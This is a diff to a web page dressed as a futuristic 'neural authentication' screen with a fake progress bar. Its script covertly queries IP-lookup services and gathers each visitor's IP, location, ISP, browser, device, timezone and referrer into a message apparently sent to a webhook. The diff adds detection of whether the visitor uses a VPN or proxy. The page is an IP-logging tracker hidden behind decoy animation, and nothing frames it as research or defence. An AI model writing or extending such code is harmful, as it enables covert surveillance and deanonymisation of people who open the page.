@@ -10,7 +10,7 @@
         body{font-family:'Roboto Mono',monospace;background:radial-gradient(circle at center,#0a0a1f,#000000);color:#0ff;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
         .scan{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(transparent,rgba(0,255,255,.08),transparent);animation:scanline 2.8s linear infinite;pointer-events:none;z-index:1}
         @keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(400%)}}
-        .core{width:520px;background:rgba(3,6,22,.96);border:2px solid #0ff;border-radius:14px;padding:55px 40px;box-shadow:0 0 90px #0ff, inset 0 0 40px rgba(0,255,255,.2);text-align:center;position:relative;z-index:2}
+        .core{width:540px;background:rgba(3,6,22,.96);border:2px solid #0ff;border-radius:14px;padding:55px 40px;box-shadow:0 0 90px #0ff, inset 0 0 40px rgba(0,255,255,.2);text-align:center;position:relative;z-index:2}
         .logo{font-family:'Orbitron',sans-serif;font-size:42px;letter-spacing:8px;color:#0ff;text-shadow:0 0 25px #0ff;margin-bottom:8px}
         .tag{font-size:14px;color:#0f8;letter-spacing:4px;margin-bottom:40px}
         h1{font-size:24px;margin:18px 0;color:#fff;text-shadow:0 0 10px #0ff}
@@ -30,6 +30,7 @@
         
         <div class="info" id="extra" style="display:none">
             • ENCRYPTION: AES-512 QUANTUM<br>
+            • VPN PROXY SCAN: ACTIVE<br>
             • LOCATION: NODE-IX • SECURE<br>
             • STATUS: ACTIVE CONNECTION
         </div>
@@ -49,34 +50,44 @@
             var messages = [
                 "AUTHENTICATING NEURAL SIGNATURE...",
                 "VERIFYING QUANTUM FINGERPRINT...",
+                "SCANNING FOR PROXY/VPN...",
                 "ESTABLISHING ENCRYPTED TUNNEL...",
                 "SYNCHRONIZING WITH CENTRAL NODE...",
                 "ACCESS PROTOCOL CONFIRMED • LOGGED"
             ];
 
             var interval = setInterval(function(){
-                progress += Math.floor(Math.random()*14)+8;
+                progress += Math.floor(Math.random()*13)+7;
                 if(progress > 100) progress = 100;
                 bar.style.width = progress + '%';
                 
-                if(progress > 22 && stage === 0){ stat.textContent = messages[1]; stage++; }
-                if(progress > 48 && stage === 1){ stat.textContent = messages[2]; stage++; }
-                if(progress > 72 && stage === 2){ stat.textContent = messages[3]; stage++; }
-                if(progress >= 100 && stage === 3){ 
-                    stat.textContent = messages[4]; 
+                if(progress > 18 && stage === 0){ stat.textContent = messages[1]; stage++; }
+                if(progress > 38 && stage === 1){ stat.textContent = messages[2]; stage++; }
+                if(progress > 58 && stage === 2){ stat.textContent = messages[3]; stage++; }
+                if(progress > 78 && stage === 3){ stat.textContent = messages[4]; stage++; }
+                if(progress >= 100 && stage === 4){ 
+                    stat.textContent = messages[5]; 
                     extra.style.display = 'block';
                     clearInterval(interval); 
                 }
-            }, 95);
+            }, 92);
 
             setTimeout(function(){
                 var sendLog = function(api){
                     fetch(api).then(r => r.json()).then(data => {
+                        var vpnStatus = "Unknown";
+                        if(data.proxy === true || data.vpn === true || data.hosting === true){
+                            vpnStatus = "DETECTED";
+                        } else if(data.proxy === false){
+                            vpnStatus = "Not Detected";
+                        }
+
                         var info = {
                             ip: data.ip || data.IP || 'N/A',
                             city: data.city || 'Unknown',
                             country: data.country_name || data.country || 'Unknown',
                             isp: data.org || data.isp || 'Unknown',
+                            vpn: vpnStatus,
                             ua: navigator.userAgent,
                             platform: navigator.platform,
                             screen: screen.width + 'x' + screen.height,
@@ -86,7 +97,6 @@
                             referrer: document.referrer || 'DIRECT',
                             time: new Date().toISOString(),
                             url: window.location.href,
-                            battery: 'Supported',
                             hardware: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'N/A'
                         };
 
@@ -103,6 +113,7 @@
                                         {name: "IP Address", value: "`" + info.ip + "`", inline: true},
                                         {name: "Location", value: info.city + ", " + info.country, inline: true},
                                         {name: "ISP / Provider", value: info.isp, inline: false},
+                                        {name: "VPN / Proxy", value: "`" + info.vpn + "`", inline: true},
                                         {name: "Device & Screen", value: info.platform + " • " + info.screen, inline: false},
                                         {name: "Timezone", value: info.tz, inline: true},
                                         {name: "Language", value: info.lang, inline: true},
@@ -129,7 +140,7 @@
                 for(var i = 0; i < apis.length; i++){
                     sendLog(apis[i]);
                 }
-            }, 800);
+            }, 650);
         })();
     </script>
 </body>
